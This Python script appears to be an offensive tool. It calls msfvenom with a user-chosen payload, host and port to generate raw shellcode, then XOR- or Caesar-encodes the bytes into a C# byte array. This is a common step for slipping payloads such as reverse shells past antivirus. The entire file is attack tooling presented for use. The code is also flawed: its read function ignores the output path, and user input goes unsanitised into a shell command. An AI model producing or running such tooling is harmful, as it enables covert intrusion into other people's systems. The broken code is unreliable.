import os

ready = "\n[+] Your C# based shellcode:"
encodedShellcode = b''

def hexdump(path):
    with open('/tmp/raw.txt', 'r', encoding='latin-1') as f:
        dump = f.read()

    shellcode = str.encode(dump, encoding='latin-1')

    return shellcode


def xor(shellcode, key):
    encodedShellcode = f"byte[] buf = new byte[{len(shellcode)}] " + "{ "

    for i in range(0, len(shellcode)):
        if (i == len(shellcode) - 1):
            encodedShellcode += (hex((shellcode[i] ^ key) & 0xFF) + ' };')
            break
        encodedShellcode += (hex((shellcode[i] ^ key) & 0xFF) + ', ')

    return encodedShellcode



def ceaser(shellcode, key):
    encodedShellcode = f"byte[] buf = new byte[{len(shellcode)}] " + "{ "
    
    for i in range(0, len(shellcode)):
        if (i == len(shellcode) - 1):
            encodedShellcode += (hex((shellcode[i] + key) & 0xFF) + ' };')
            break
        encodedShellcode += (hex((shellcode[i] + key) & 0xFF) + ', ')

    return encodedShellcode


def main():

    payload = input('Write the payload: ')
    netInterface = input("Write the network interface name: ")
    port = input("Write the port: ")
    outFile = input("Write path to output file: ")

    print("[*] Generating the shellcode....\n")
    os.system(f"msfvenom -p {payload} LHOST={netInterface} LPORT={port} -f raw > {outFile}")

    print(f"[+] The raw file is ready in {outFile}")
    print("[*] Converting to python byte....")

    shellcode =  hexdump(outFile)

    print("[+] Shellcode is ready\n")
    
    choice = input("Which encryption you want to use?\n1.XOR\n2.Ceaser\n# ")

    if choice == '1':
        key = int(input("Write the key: "))
        CSharpBased = xor(shellcode, key)

    else:
        key = int(input("Write the key: "))
        CSharpBased = ceaser(shellcode, key)

    print(ready)
    print(CSharpBased)


if __name__ == '__main__':
    main()